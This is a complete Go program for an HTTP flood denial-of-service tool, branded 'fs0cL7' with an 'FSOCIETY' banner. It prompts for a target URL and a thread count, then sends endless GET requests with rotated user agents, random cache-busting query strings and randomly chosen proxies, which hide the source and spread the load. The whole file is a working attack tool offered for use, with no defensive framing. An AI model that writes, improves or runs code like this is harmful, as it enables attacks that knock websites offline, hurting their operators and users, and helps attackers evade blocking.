package main

import (
	"bufio"
	"context"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Cyan   = "\033[36m"
	Reset  = "\033[0m"
)

var (
	successCount uint64
	errorCount   uint64
	userAgents   = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
	}
)

func loadProxies(fileName string) []string {
	file, err := os.Open(fileName)
	if err != nil {
		return nil
	}
	defer file.Close()

	var list []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := scanner.Text()
		if proxy != "" {
			list = append(list, proxy)
		}
	}
	return list
}

func banner() {
	content, err := os.ReadFile("Fsoc.txt")
	if err != nil {
		fmt.Println(Red + ">> FSOCIETY TERMINAL <<" + Reset)
	} else {
		fmt.Print(Red + string(content) + Reset)
	}
	fmt.Println(Cyan + "\n------------------------------------------------------------------------------" + Reset)
	fmt.Println(Yellow + "[*] Project: fs0cL7 | Status: Proxy-Engine Active | Mode: Stealth Assault" + Reset)
	fmt.Println(Cyan + "------------------------------------------------------------------------------\n" + Reset)
}

func getRandUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func getRandStr(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func attack(ctx context.Context, target string, client *http.Client, wg *sync.WaitGroup) {
	defer wg.Done()

	for {
		select {
		case <-ctx.Done():
			return
		default:
			bypassURL := fmt.Sprintf("%s?v=%s", target, getRandStr(6))
			req, _ := http.NewRequestWithContext(ctx, "GET", bypassURL, nil)
			req.Header.Set("User-Agent", getRandUA())
			req.Header.Set("Cache-Control", "no-cache")
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Connection", "keep-alive")

			resp, err := client.Do(req)
			if err == nil {
				atomic.AddUint64(&successCount, 1)
				resp.Body.Close()
			} else {
				atomic.AddUint64(&errorCount, 1)
			}
		}
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	banner()

	proxies := loadProxies("proxies.txt")
	if len(proxies) > 0 {
		fmt.Printf(Green+"[+] Loaded %d proxies. Ready for distributed assault.\n"+Reset, len(proxies))
	} else {
		fmt.Println(Red + "[!] No proxies found in proxies.txt. Using direct connection." + Reset)
	}

	var target string
	var threads int

	fmt.Print(Blue + "[?] Target (e.g., http://target.com): " + Reset)
	fmt.Scanln(&target)
	fmt.Print(Blue + "[?] Daemons (Threads): " + Reset)
	fmt.Scanln(&threads)

	if target == "" || threads <= 0 {
		fmt.Println(Red + "[!] Invalid parameters." + Reset)
		return
	}

	transport := &http.Transport{
		MaxIdleConns:        threads,
		IdleConnTimeout:     30 * time.Second,
		DisableCompression:  true,
		Proxy: func(req *http.Request) (*url.URL, error) {
			if len(proxies) > 0 {
				// Chọn ngẫu nhiên 1 proxy cho mỗi request mới
				p := proxies[rand.Intn(len(proxies))]
				return url.Parse("http://" + p)
			}
			return nil, nil
		},
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   time.Second * 10,
	}

	ctx, cancel := context.WithCancel(context.Background())
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	fmt.Printf("\n"+Yellow+"[!] Executing payload: %s"+Reset+"\n", target)

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attack(ctx, target, client, &wg)
	}

	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			default:
				fmt.Printf("\r\033[K"+Green+"[+] SUCCESS: %d "+Reset+"|"+Red+" [-] FAILED: %d"+Reset,
					atomic.LoadUint64(&successCount),
					atomic.LoadUint64(&errorCount))
				time.Sleep(300 * time.Millisecond)
			}
		}
	}()

	<-sigChan
	fmt.Println("\n\n" + Yellow + "[!] Retracting daemons..." + Reset)
	cancel()
	wg.Wait()
	fmt.Println(Green + "[+] Done. The revolution is invisible." + Reset)
}

